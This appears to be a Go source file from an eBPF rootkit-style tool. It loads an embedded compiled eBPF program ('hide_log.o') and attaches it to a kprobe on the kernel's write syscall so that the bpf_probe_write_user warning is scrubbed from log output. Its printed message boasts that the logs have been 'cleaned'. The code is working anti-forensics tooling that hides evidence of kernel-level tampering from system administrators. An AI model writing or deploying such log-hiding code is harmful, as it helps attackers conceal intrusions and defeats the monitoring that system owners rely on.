package ebpf

import (
	"bytes"
	_ "embed"
	"fmt"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
)

//go:embed obj/hide_log.o
var hideLogObj []byte

// Load and attach the hide_log eBPF program to kprobe __x64_sys_write
func LoadAndAttachHideLog() (link.Link, error) {
	spec, err := ebpf.LoadCollectionSpecFromReader(bytes.NewReader(hideLogObj))
	if err != nil {
		return nil, fmt.Errorf("failed to load spec: %w", err)
	}

	coll, err := ebpf.NewCollection(spec)
	if err != nil {
		return nil, fmt.Errorf("failed to create collection: %w", err)
	}

	prog := coll.Programs["trace_write"]
	if prog == nil {
		return nil, fmt.Errorf("trace_write program not found")
	}

	kprobe, err := link.Kprobe("__x64_sys_write", prog, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to attach kprobe: %w", err)
	}
	fmt.Printf("👻 Logs output cleaned from bpf_probe_write_user warning\n")

	return kprobe, nil
}
